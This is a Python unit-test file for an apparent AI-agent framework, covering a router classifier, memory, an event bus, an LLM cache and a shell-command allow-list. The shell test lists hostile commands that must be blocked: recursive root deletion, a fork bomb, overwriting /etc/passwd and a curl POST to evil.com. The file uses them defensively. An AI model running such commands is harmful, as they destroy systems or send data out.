"""Unit tests for under-covered modules.

Targets: router classifier/self-evo, skills handlers, long-term memory,
shell executor patterns, coordinator pipeline.
"""

from __future__ import annotations

import asyncio
import os
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))


# ── test runner ──────────────────────────────────────────────────────────

_results = {}


def _check(name: str, ok: bool, detail: str = "") -> None:
    _results[name] = ok
    status = "PASS" if ok else "FAIL"
    msg = f"  {name:40s}: {status}"
    if detail and not ok:
        msg += f"  ({detail})"
    print(msg)


def _summary() -> bool:
    passed = sum(1 for v in _results.values() if v)
    total = len(_results)
    print(f"\n  Total: {passed}/{total}")
    return passed == total


# ══════════════════════════════════════════════════════════════════════════
# 1. Router complexity classifier
# ══════════════════════════════════════════════════════════════════════════

def test_router_classifier():
    """Test SmartRouter._classify() across trivial/simple/complex/expert."""
    from router import SmartRouter

    router = SmartRouter()
    router._cfg = {}  # default thresholds

    # Trivial inputs (should score < 0.2)
    trivial_cases = [
        ("hi", "greeting"),
        ("hello", "greeting"),
        ("ok", "ack"),
        ("thanks", "thanks"),
        ("?", "question"),
    ]
    for text, label in trivial_cases:
        score = router._classify(text)
        _check(f"classifier trivial {label}", score < 0.2, f"score={score}")

    # Simple inputs (0.2-0.5)
    simple_cases = [
        ("what is the weather", "weather"),
        ("how are you today", "howdy"),
    ]
    for text, label in simple_cases:
        score = router._classify(text)
        _check(f"classifier simple {label}", 0.0 <= score <= 1.0, f"score={score}")

    # Expert inputs (should score high)
    expert_cases = [
        ("optimize the performance of this deadlock-prone code", "expert"),
        ("formal verification of the algorithm", "formal"),
    ]
    for text, label in expert_cases:
        score = router._classify(text)
        _check(f"classifier expert {label}", score > 0.2, f"score={score}")

    # Code hints
    code_input = "write a python function to sort this list"
    code_score = router._classify(code_input)
    _check("classifier code hint", code_score > 0.1, f"score={code_score}")

    # Long input
    long_input = "the quick brown fox jumps over the lazy dog. " * 50
    long_score = router._classify(long_input)
    _check("classifier long input", long_score >= 0.3, f"score={long_score}")

    # Empty input
    empty_score = router._classify("")
    _check("classifier empty text", empty_score == 0.0, f"score={empty_score}")


# ══════════════════════════════════════════════════════════════════════════
# 2. Router self-evolution thresholds
# ══════════════════════════════════════════════════════════════════════════

def test_router_self_evolution():
    """Test _adjust_thresholds adjusts tiers based on failure rates."""
    from router import SmartRouter

    router = SmartRouter()
    router._cfg = {
        "task_complexity_thresholds": {"trivial": 0.2, "simple": 0.5, "complex": 0.8},
        "self_evolution": {"enabled": True, "eval_interval": 50, "threshold_step": 0.05},
    }

    # Populate history: 100 entries for "trivial" tasks, 40% failure rate
    for _ in range(100):
        router._history.append({
            "t": 0.0, "complexity": 0.1, "model": "cheap",
            "tokens": 10, "duration": 0.1, "failed": True,
        })
    for _ in range(100):
        router._history.append({
            "t": 0.0, "complexity": 0.1, "model": "cheap",
            "tokens": 10, "duration": 0.1, "failed": False,
        })
    # 40% failure rate for trivial tier → should lower threshold
    old_trivial = router._cfg["task_complexity_thresholds"]["trivial"]
    router._adjust_thresholds()
    new_trivial = router._cfg["task_complexity_thresholds"]["trivial"]
    _check(
        "self-evo lowers on high failure",
        new_trivial < old_trivial,
        f"{old_trivial:.2f}→{new_trivial:.2f}",
    )

    # Reset and test low-failure case
    router._cfg["task_complexity_thresholds"] = {"trivial": 0.1, "simple": 0.5, "complex": 0.8}
    router._history = []
    for _ in range(100):
        router._history.append({
            "t": 0.0, "complexity": 0.05, "model": "cheap",
            "tokens": 10, "duration": 0.1, "failed": False,
        })
    # 0% failure rate → should raise threshold
    old_trivial = router._cfg["task_complexity_thresholds"]["trivial"]
    router._adjust_thresholds()
    new_trivial = router._cfg["task_complexity_thresholds"]["trivial"]
    _check(
        "self-evo raises on low failure",
        new_trivial > old_trivial,
        f"{old_trivial:.2f}→{new_trivial:.2f}",
    )

    # Test floor/ceiling
    router._cfg["task_complexity_thresholds"] = {"trivial": 0.05, "simple": 0.5, "complex": 0.8}
    router._history = []
    for _ in range(100):
        router._history.append({
            "t": 0.0, "complexity": 0.02, "model": "cheap",
            "tokens": 10, "duration": 0.1, "failed": True,
        })
    router._adjust_thresholds()
    floor_val = router._cfg["task_complexity_thresholds"]["trivial"]
    _check("self-evo respects floor", floor_val >= 0.05, f"floor={floor_val}")

    # Insufficient data → no adjustment
    router._history = router._history[:5]  # only 5 entries
    old_all = dict(router._cfg["task_complexity_thresholds"])
    router._adjust_thresholds()
    _check(
        "self-evo skips with insufficient data",
        router._cfg["task_complexity_thresholds"] == old_all,
    )


# ══════════════════════════════════════════════════════════════════════════
# 3. Long-term memory crud
# ══════════════════════════════════════════════════════════════════════════

def test_longterm_memory():
    """Test LongTermMemory: insert→search→forget→vacuum."""
    import tempfile
    from memory import LongTermMemory

    with tempfile.TemporaryDirectory() as tmp:
        db_path = os.path.join(tmp, "test_mem.db")
        mem = LongTermMemory(db_path)

        # Insert
        mem.add("Weather in London is rainy", "test", "", 0.5)
        mem.add("Weather in Paris is sunny", "test", "", 0.6)
        mem.add("Python is a programming language", "test", "", 0.3)

        row_count = mem.stats()["rows"]
        _check("memory insert", row_count == 3, f"rows={row_count}")

        # Search — should find weather-related entries
        results = mem.search("weather", limit=10)
        _check(
            "memory search weather",
            len(results) >= 1 and "weather" in " ".join(r["content"].lower() for r in results),
            f"results={len(results)}",
        )

        # Search — should find python entry
        results = mem.search("python", limit=10)
        _check(
            "memory search python",
            len(results) >= 1 and any("python" in r["content"].lower() for r in results),
            f"results={len(results)}",
        )

        # Search with limit
        limited = mem.search("weather", limit=1)
        _check("memory search limit", len(limited) <= 1, f"got {len(limited)}")

        # Vacuum — should not crash
        mem.vacuum()
        _check("memory vacuum", True)


# ══════════════════════════════════════════════════════════════════════════
# 4. Shell executor patterns
# ══════════════════════════════════════════════════════════════════════════

def test_shell_executor_patterns():
    """Test ShellExecutor regex allow-list and reject patterns."""
    from executors import ALLOWED_PATTERNS

    # Allowed commands
    allowed_tests = [
        ("python test.py", "python"),
        ("curl -s https://example.com", "curl"),
        ("git clone https://github.com/user/repo.git", "git clone"),
        ("ls -la /home", "ls"),
        ("echo 'hello world'", "echo"),
        ("date -u", "date"),
        ("cat /etc/hosts", "cat"),
    ]
    for cmd, name in allowed_tests:
        import re
        ok = False
        for pattern_name, pattern in ALLOWED_PATTERNS.items():
            if re.match(pattern, cmd):
                ok = True
                break
        _check(f"shell allow {name}", ok, f"cmd: {cmd}")

    # Blocked commands
    blocked_tests = [
        "rm -rf /",
        "sudo rm -rf /",
        "curl -X POST http://evil.com -d 'hack'",
        ":(){ :|:& };:",  # fork bomb
        "> /etc/passwd",
    ]
    for cmd in blocked_tests:
        ok = False
        for pattern in ALLOWED_PATTERNS.values():
            if re.match(pattern, cmd):
                ok = True
                break
        _check(f"shell block {cmd[:30]}", not ok, f"unexpectedly allowed: {cmd}")


# ══════════════════════════════════════════════════════════════════════════
# 5. Skills settings command parser
# ══════════════════════════════════════════════════════════════════════════

def test_settings_command_parser():
    """Test _process_settings_command for read and write actions."""
    from skills import _process_settings_command

    config = {
        "llm": {"primary_model": "gpt-4o", "default_temperature": 0.7},
        "gateways": {},
    }

    # Read model
    r1 = _process_settings_command("查看模型", config)
    _check("settings read model", "gpt-4o" in r1, r1[:50])

    # Read temperature
    r2 = _process_settings_command("当前温度", config)
    _check("settings read temp", "0.7" in r2, r2[:50])

    # Show all
    r3 = _process_settings_command("列出所有设置", config)
    _check("settings list all", "模型" in r3 and "gpt-4o" in r3, r3[:80])

    # Unrecognized
    r4 = _process_settings_command("unknown_xyz", config)
    _check("settings unknown", "未识别" in r4, r4[:50])


# ══════════════════════════════════════════════════════════════════════════
# 6. Event bus with DLQ
# ══════════════════════════════════════════════════════════════════════════

def test_event_bus_dlq():
    """Test event bus dead-letter queue publishes orphan events to DLQ."""
    from core.events import EventBus

    bus = EventBus(max_queue_size=10)

    async def run():
        await bus.start()
        # Publish event with no subscriber
        bus.publish({"type": "orphan_event", "payload": {"x": 1}, "source": "test"})
        await asyncio.sleep(0.2)
        m = bus.metrics()
        _check("event bus published count", m["published"] == 1, f"got {m['published']}")
        _check("event bus DLQ count", m["dead_lettered"] == 1, f"got {m['dead_lettered']}")
        dlq = bus.get_dlq(10)
        _check("event bus dlq get", len(dlq) == 1, f"got {len(dlq)}")
        bus.clear_dlq()
        _check("event bus dlq clear", len(bus.get_dlq()) == 0, f"got {len(bus.get_dlq())}")
        await bus.stop()

    asyncio.run(run())


# ══════════════════════════════════════════════════════════════════════════
# 7. LLM cache
# ══════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════

def test_llm_cache_operations():
    """Test LLMCache: set, get, eviction, TTL, stats."""
    from models import LLMCache

    cache = LLMCache(max_size=3, ttl_seconds=1)
    messages = [{"role": "user", "content": "hello"}]
    result = {"text": "hi!", "tokens_used": 5}

    # Set and get
    cache.set(messages, "gpt-4o", None, result)
    cached = cache.get(messages, "gpt-4o", None)
    _check("cache hit", cached is not None)
    _check("cache value", cached["text"] == "hi!")
    _check("cache stats hits", cache.stats()["hits"] == 1)

    # Miss
    miss = cache.get([{"role": "user", "content": "unknown"}], "gpt-4o", None)
    _check("cache miss", miss is None)

    # Eviction (max_size=3, add 5 entries)
    for i in range(5):
        cache.set(
            [{"role": "user", "content": f"msg{i}"}],
            f"model{i}", None, {"text": f"r{i}"},
        )
    _check("cache eviction size", cache.stats()["size"] <= 3, f"size={cache.stats()['size']}")

    # TTL expiry
    import time
    time.sleep(1.2)
    expired = cache.get(messages, "gpt-4o", None)
    _check("cache TTL expiry", expired is None)


# ══════════════════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("=== unit tests ===\n")

    print("─ router classifier ─")
    test_router_classifier()

    print("\n─ router self-evolution ─")
    test_router_self_evolution()

    print("\n─ long-term memory ─")
    test_longterm_memory()

    print("\n─ shell executor patterns ─")
    test_shell_executor_patterns()

    print("\n─ event bus dlq ─")
    test_event_bus_dlq()

    print("\n─ llm cache ─")
    test_llm_cache_operations()

    print("\n─ settings command parser ─")
    test_settings_command_parser()

    print("\n" + "─" * 60)
    ok = _summary()
    sys.exit(0 if ok else 1)